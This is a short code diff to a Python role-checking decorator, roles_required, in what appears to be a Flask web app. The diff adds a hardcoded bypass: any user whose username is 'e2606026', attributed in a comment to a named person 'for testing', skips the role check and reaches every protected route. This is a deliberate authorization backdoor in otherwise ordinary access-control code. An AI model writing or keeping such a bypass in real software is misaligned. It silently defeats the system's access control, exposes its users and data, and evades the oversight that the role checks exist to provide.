@@ -53,6 +53,10 @@ def roles_required(*roles: UserRole) -> Callable:
             if not current_user.is_authenticated:
                 return redirect(url_for("authentication.login", next=request.url))
 
+            # HARDCODED BYPASS: Allow e2606026 (Durvesh Parab) bypass for testing
+            if hasattr(current_user, 'username') and current_user.username == 'e2606026':
+                return fn(*args, **kwargs)
+
             user_role = getattr(current_user, "role", None)
             # Extract enum values for comparison (user_role is a string)
             allowed_roles = [r.value for r in roles]
